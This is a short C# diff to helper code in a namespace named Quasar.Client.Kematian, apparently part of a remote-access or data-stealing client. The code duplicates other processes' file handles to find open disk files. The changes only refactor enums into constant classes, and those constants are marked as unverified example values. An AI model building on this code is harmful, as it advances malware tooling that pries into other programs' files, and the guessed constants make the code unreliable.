@@ -68,7 +68,7 @@ namespace Quasar.Client.Kematian.HelpingMethods
 
                 if (DupHandle((int)handleInfo.UniqueProcessId, (IntPtr)(ulong)handleInfo.HandleValue, out IntPtr duplicatedHandle))
                 {
-                    if ((FileType)NativeMethods.GetFileType(duplicatedHandle) != FileType.FILE_TYPE_DISK)
+                    if (NativeMethods.GetFileType(duplicatedHandle) != FileType.FILE_TYPE_DISK)
                     {
                         NativeMethods.CloseHandle(duplicatedHandle);
                         continue;
@@ -169,7 +169,7 @@ namespace Quasar.Client.Kematian.HelpingMethods
     public static class NativeMethods
     {
         public static uint NtQuerySystemInformation(
-            SYSTEM_INFORMATION_CLASS systemInformationClass,
+            int systemInformationClass,
             IntPtr systemInformation,
             uint systemInformationLength,
             out uint returnLength)
@@ -192,13 +192,13 @@ namespace Quasar.Client.Kematian.HelpingMethods
         }
     }
 
-    public enum SYSTEM_INFORMATION_CLASS
+    public class SYSTEM_INFORMATION_CLASS
     {
-        SystemExtendedHandleInformation = 64 // Example value, verify with actual documentation
+        public const int SystemExtendedHandleInformation = 64; // Example value, verify with actual documentation
     }
 
-    public enum FileType
+    public class FileType
     {
-        FILE_TYPE_DISK = 1 // Example value, verify with actual documentation
+        public const uint FILE_TYPE_DISK = 1; // Example value, verify with actual documentation
     }
 }
